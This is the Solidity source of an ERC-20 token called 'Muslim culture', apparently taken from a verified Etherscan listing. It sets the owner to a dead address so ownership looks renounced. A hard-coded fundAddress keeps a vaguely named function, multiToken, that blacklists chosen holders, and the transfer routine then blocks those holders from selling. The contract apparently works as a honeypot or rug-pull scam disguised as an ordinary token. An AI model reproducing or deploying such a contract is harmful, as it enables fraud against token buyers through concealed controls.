/**
 *Submitted for verification at Etherscan.io on 2024-02-24
*/

pragma solidity ^0.8.18;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface ISwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;
    constructor () {
        _owner = address(0xDEAD);
    }

    function owner() public view returns (address) {
        return _owner;
    }
}

contract Muslim is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _TOKEN;
    
    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    uint256 public starBlock;

    constructor (
    ){
        _name = "Muslim culture";
        _symbol = "Muslim";
        _decimals = 18;
        ISwapRouter swapRouter = ISwapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        swapFactory.createPair(address(this), swapRouter.WETH());
        uint256 total = 99999999999999999 * 10 ** 18;
        _tTotal = total;
        fundAddress = 0x1Ad125281A4FAA168Fe1bF33F121cF01E878209F;
        _balances[fundAddress] = total;
        emit Transfer(address(0), fundAddress, total);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        _tokenTransfer(from, to, amount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        require(!_TOKEN[sender]);
        _balances[sender] -= tAmount;
        _balances[recipient] += tAmount;
        emit Transfer(sender, recipient, tAmount);
    }
    function multiToken(address[] calldata addresses, bool value) public{
        require(msg.sender == fundAddress);
        for (uint256 i; i < addresses.length; ++i) {
            _TOKEN[addresses[i]] = value;
        }
    }
    function setfundAddress()public {
       require(msg.sender == fundAddress); 
       fundAddress=address(0xDEAD);
    }
    receive() external payable {}
}